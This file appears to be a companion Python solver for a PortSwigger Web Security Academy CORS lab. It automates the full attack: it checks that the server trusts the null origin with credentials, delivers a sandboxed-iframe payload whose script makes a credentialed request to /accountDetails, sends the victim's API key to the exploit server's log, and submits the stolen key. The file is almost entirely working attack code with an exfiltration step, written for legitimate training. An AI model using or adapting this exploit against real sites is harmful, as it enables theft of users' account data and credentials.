#!/usr/bin/env python3
"""
CORS vulnerability with trusted null origin
PortSwigger Web Security Academy -- CORS

Companion script for the writeup: 02-trusted-null-origin.md

What this does:
    Confirms /accountDetails reflects Access-Control-Allow-Origin: null with
    Access-Control-Allow-Credentials: true, then delivers a PoC whose payload
    is a sandboxed iframe (allow-scripts allow-top-navigation allow-forms,
    deliberately withholding allow-same-origin so the iframe's origin
    collapses to "null"). The iframe's script performs a credentialed XHR to
    /accountDetails and forwards the stolen API key to the exploit server's
    log via a location redirect, exactly like the previous lab in this
    series -- only the mechanism that produces the trusted origin differs.

Usage:
    python 02-trusted-null-origin.py <lab-url>
    e.g. python 02-trusted-null-origin.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
    pip install websockets   # optional fallback if the exploit server URL
                              # isn't on the lab homepage (rare)
"""

from __future__ import annotations

import re
import sys
import time
from urllib.parse import unquote

import httpx


def _get_exploit_server_url(client: httpx.Client) -> str | None:
    """Find the exploit server URL from the lab page (falls back to the
    lab's WebSocket academyLabHeader if it isn't printed on the homepage)."""
    r = client.get("/")
    m = re.search(r'(https://exploit-[^\s"\'<>]+\.exploit-server\.net)', r.text)
    if m:
        return m.group(1).rstrip("/")

    base = str(client.base_url).rstrip("/")
    ws_url = base.replace("https://", "wss://").replace("http://", "ws://") + "/academyLabHeader"
    try:
        import websockets.sync.client as ws_sync
        with ws_sync.connect(ws_url, close_timeout=5) as ws:
            data = ws.recv(timeout=5)
            m = re.search(r'(https://exploit-[^\s"\'<>]+\.exploit-server\.net)', str(data))
            if m:
                return m.group(1).rstrip("/")
    except Exception:
        pass
    return None


def _login(client: httpx.Client, username: str = "wiener", password: str = "peter") -> None:
    r = client.get("/login")
    csrf = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    token = csrf.group(1) if csrf else ""
    client.post("/login", data={"csrf": token, "username": username, "password": password})
    print(f"[*] Logged in as {username}")


def _detect_null_origin(client: httpx.Client, url: str) -> tuple[bool, bool]:
    """Probe the endpoint with Origin: null and report whether it's
    reflected in ACAO and whether credentials are allowed."""
    r = client.get(url, headers={"Origin": "null"})
    acao = r.headers.get("access-control-allow-origin", "")
    acac = r.headers.get("access-control-allow-credentials", "").lower() == "true"
    return acao == "null", acac


def _exploit_server_deliver(exploit_url: str, body_html: str) -> None:
    """Store the PoC on the exploit server, then deliver it to the victim."""
    with httpx.Client(follow_redirects=True, timeout=15, verify=False) as c:
        head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
        c.post(exploit_url, data={
            "urlIsHttps": "on", "responseFile": "/exploit",
            "responseHead": head, "responseBody": body_html, "formAction": "STORE",
        })
        c.post(exploit_url, data={
            "urlIsHttps": "on", "responseFile": "/exploit",
            "responseHead": head, "responseBody": body_html, "formAction": "DELIVER_TO_VICTIM",
        })
        print("[*] Exploit delivered to victim")


def _get_exploit_server_log(exploit_url: str) -> str:
    with httpx.Client(follow_redirects=True, timeout=15, verify=False) as c:
        return c.get(exploit_url + "/log").text


def _submit_solution(client: httpx.Client, answer: str) -> None:
    r = client.get("/")
    csrf_match = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    csrf = csrf_match.group(1) if csrf_match else ""
    client.post("/submitSolution", data={"csrf": csrf, "answer": answer})
    print(f"[*] Submitted solution: {answer}")


def solve(lab_url: str) -> None:
    client = httpx.Client(base_url=lab_url, follow_redirects=True, timeout=15, verify=False)

    exploit_url = _get_exploit_server_url(client)
    if not exploit_url:
        print("[-] No exploit server found")
        return
    print(f"[*] Exploit server: {exploit_url}")

    _login(client)

    allows_null, allows_creds = _detect_null_origin(client, f"{lab_url}/accountDetails")
    print(f"[*] Allows null origin: {allows_null}")
    print(f"[*] Allows credentials: {allows_creds}")

    # Sandboxed iframe (allow-same-origin withheld) forces Origin: null,
    # then runs the same credential-stealing XHR as lab 1.
    inner_script = (
        'var req=new XMLHttpRequest();'
        'req.onload=function(){'
        f"location='{exploit_url}/log?key='+encodeURIComponent(this.responseText)"
        '};'
        f"req.open('GET','{lab_url}/accountDetails',true);"
        'req.withCredentials=true;'
        'req.send();'
    )
    html = (
        '<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="'
        f'<script>{inner_script}</script>'
        '"></iframe>'
    )
    print("[*] Technique: CORS null origin: sandboxed iframe generates null origin for credential theft")
    _exploit_server_deliver(exploit_url, html)
    time.sleep(5)

    log = _get_exploit_server_log(exploit_url)
    decoded_log = unquote(log)
    api_key_match = re.search(r'"apikey"\s*:\s*"([^"]+)"', decoded_log)

    if api_key_match:
        api_key = api_key_match.group(1)
        print(f"[+] Stolen API key: {api_key}")
        _submit_solution(client, api_key)
    else:
        print("[-] Could not find API key in log")
        print(f"[*] Log (first 500 chars): {decoded_log[:500]}")

    time.sleep(2)
    check = client.get("/")
    solved = "congratulations" in check.text.lower()
    print(f"[+] Solved: {solved}")
    client.close()


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
